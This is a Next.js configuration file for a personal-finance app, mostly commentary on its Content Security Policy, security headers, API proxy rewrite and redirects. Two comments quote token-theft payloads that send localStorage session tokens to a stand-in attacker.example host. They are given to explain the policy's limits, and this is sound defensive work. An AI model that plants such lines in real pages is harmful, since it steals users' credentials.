/** @type {import('next').NextConfig} */

// Routes retired in the 2026-07-30 restructure (7 tabs -> 4).
//
// Redirects rather than deletions: these URLs are in browser history, and
// /dashboard is still the post-login target configured in Supabase's OAuth
// provider settings — which live in a dashboard, not in this repo. A 404 there
// would break Google sign-in with no clue why.
//
// Permanent (308) where the move is permanent: /cards genuinely became
// /portfolio. /dashboard is temporary (307) because it returns as "Today" once
// the opportunity engine gives it content, and a permanent redirect cached in
// users' browsers would be awkward to undo.
// Origins this app legitimately talks to. Read from the same env vars the
// client itself reads — `lib/supabase.ts` — so the policy cannot drift from the
// configuration it describes.
//
// The name matters and got this wrong once: the backend variable is
// NEXT_PUBLIC_BACKEND_URL, not NEXT_PUBLIC_API_URL. With the wrong name the
// list silently came back one origin short, `connect-src` omitted the backend,
// and the policy would have blocked every API call in production while building
// and testing clean locally. Hence the assertion below — a security header
// that fails open is bad, and one that fails closed takes the app down.
const API_URL_VAR = "NEXT_PUBLIC_BACKEND_URL";

// The backend is deliberately NOT in this list any more (2026-07-30). API calls
// are relative and proxied by the rewrite below, so the only cross-origin
// request the browser still makes is to Supabase for auth. Narrowing this was
// the point of going same-origin: the exfiltration surface is now one host.
const connectOrigins = [process.env.NEXT_PUBLIC_SUPABASE_URL]
  .filter(Boolean)
  .map((url) => new URL(url).origin);

// Fail the build rather than ship a broken deployment — but only on a real one.
//
// Scoped to Vercel deliberately. An earlier version required both variables
// together or neither, which is wrong: `.env.local` here has the Supabase
// values empty on purpose (they live in Vercel), and a build without Supabase
// is a state the app already handles — `/login` says "Supabase is not
// configured" rather than failing obscurely. That guard broke the local build
// over a config gap that is not a bug.
//
// Keyed on VERCEL rather than NODE_ENV, which is not yet "production" when Next
// evaluates this file. The first version of this guard tested NODE_ENV and
// silently never fired — the same class of bug it exists to catch, which is why
// all three states below were checked by loading this config directly rather
// than assumed from reading it.
const missingOnVercel = ["NEXT_PUBLIC_SUPABASE_URL", API_URL_VAR].filter(
  (name) => !process.env[name]
);
if (process.env.VERCEL && missingOnVercel.length > 0) {
  throw new Error(
    `Missing required build-time configuration: ${missingOnVercel.join(", ")}. ` +
      `NEXT_PUBLIC_SUPABASE_URL feeds CSP connect-src — without it the browser ` +
      `cannot reach Supabase and sign-in fails. ${API_URL_VAR} is the /api/v1 ` +
      `rewrite destination — without it every API call 404s against the frontend.`
  );
}

const isDev = process.env.NODE_ENV === "development";

// Content Security Policy (privacy audit P7 mitigation, 2026-07-30).
//
// P7 is the Supabase session token living in `localStorage`, where any script
// on the origin can read it. It was accepted rather than fixed because moving
// to cookie sessions means reworking auth in `Shell`, `lib/supabase.ts` and
// every `api.ts` call — real risk to the thing that currently works.
//
// This is the cheaper defence against the same threat, and it is worth being
// precise about what it does and does not do:
//
//   It does NOT stop injected script from reading the token. `script-src`
//   carries 'unsafe-inline' because the App Router emits inline hydration
//   scripts; removing it needs per-request nonces from middleware, which forces
//   dynamic rendering on every page.
//
//   It DOES stop the token being sent anywhere. `connect-src` allows only
//   Supabase and our own API, and `form-action` and `base-uri` close the two
//   usual ways round that. A credential that can be read but not exfiltrated is
//   a much smaller problem, and this holds even with 'unsafe-inline'.
//
//   It DOES enforce the condition P7 was accepted under. That condition — "the
//   first third-party script added to the frontend" — was a sentence in a
//   document, which is a thing people do not read. As a policy, adding a vendor
//   tag now fails visibly in the browser rather than quietly invalidating a
//   decision made months earlier.
const csp = [
  "default-src 'self'",
  `script-src 'self' 'unsafe-inline'${isDev ? " 'unsafe-eval'" : ""}`,
  "style-src 'self' 'unsafe-inline'",
  // NOT `https:`. That was the first draft, waved through to avoid breaking
  // avatars this app does not display — and it silently defeated the whole
  // point of the policy. `img-src https:` permits
  //
  //     new Image().src = "https://attacker.example/?t=" + localStorage.token
  //
  // which is a complete exfiltration channel that never touches `connect-src`.
  // A CSP whose restrictive directive is bypassed by a permissive one beside it
  // is worse than no CSP, because it reads as protection.
  //
  // Every image this app renders is its own or a data URI. If a remote image is
  // ever needed, allow that one origin — never a scheme.
  "img-src 'self' data:",
  "font-src 'self' data:",
  `connect-src 'self' ${connectOrigins.join(" ")}`.trim(),
  // No embedding: this app shows one person's finances, and clickjacking it
  // into an invisible frame is the cheapest attack there is.
  "frame-ancestors 'none'",
  "object-src 'none'",
  "base-uri 'self'",
  "form-action 'self'",
].join("; ");

// The honest limit, recorded so nobody re-derives it under pressure: no CSP can
// stop `location = "https://attacker.example/?t=" + token`. Top-level
// navigation was meant to be covered by `navigate-to`, which no browser
// shipped. So a CSP raises the cost of exfiltration and closes the silent
// channels; it cannot close the loud one. That residue is a reason to keep
// `script-src` honest, not a reason to skip the policy.

const securityHeaders = [
  { key: "Content-Security-Policy", value: csp },
  { key: "X-Content-Type-Options", value: "nosniff" },
  { key: "X-Frame-Options", value: "DENY" },
  // Do not leak the path a user came from — our URLs name the section of their
  // finances they were looking at.
  { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
  { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=(), payment=()" },
];

// Same-origin API (privacy audit P7, phase 1 — 2026-07-30).
//
// The browser calls `/api/v1/...` on this origin; Vercel forwards to the
// backend. `lib/api.ts` explains what this buys. The short version: it removes
// CORS and its preflight, takes the backend's address out of the client bundle,
// and is the prerequisite for httpOnly cookie sessions — which are impossible
// while the API is on a different registrable domain, because the cookie would
// be third-party and browsers block those by default.
//
// Local development goes through the same path, on purpose. A dev-only bypass
// would mean the proxy is first exercised in production, which is where it is
// most expensive to find out it is wrong.
//
// Left as a rewrite rather than a Next.js route handler: a rewrite is proxied
// by the platform's routing layer, whereas a route handler would run as a
// serverless function and inherit its execution limit. That matters here
// because a cold backend plus a model call is the slowest request this app
// makes. Phase 2 (reading the session cookie server-side and attaching the
// bearer token) does need a route handler, and this limit has to be measured
// against the real chat latency before that lands.
// The localhost default preserves the behaviour `lib/api.ts` used to carry, so
// a fresh checkout with no configuration still talks to a local backend. It has
// simply moved from the client to the proxy, which is the whole point: the
// browser no longer knows the backend's address in any environment.
const backendUrl = (process.env[API_URL_VAR] ?? "http://localhost:8000").replace(/\/$/, "");

const apiRewrites = [{ source: "/api/v1/:path*", destination: `${backendUrl}/api/v1/:path*` }];

const nextConfig = {
  reactStrictMode: true,
  // Measured 2026-07-30: Next's rewrite proxy aborts at exactly 30s and returns
  // a 500. A cold Render dyno alone is ~15.6s before the model is called, and a
  // restart that re-ingests the Chroma corpus is ~120s, so the default would
  // turn the slowest-and-most-important request in the app into an error that
  // does not happen today.
  experimental: { proxyTimeout: 120_000 },
  async headers() {
    return [{ source: "/:path*", headers: securityHeaders }];
  },
  async rewrites() {
    return apiRewrites;
  },
  async redirects() {
    return [
      { source: "/cards", destination: "/portfolio", permanent: true },
      { source: "/transfer", destination: "/redeem", permanent: true },
      { source: "/goals", destination: "/redeem", permanent: true },
      { source: "/dashboard", destination: "/chat", permanent: false },
    ];
  },
};

export default nextConfig;
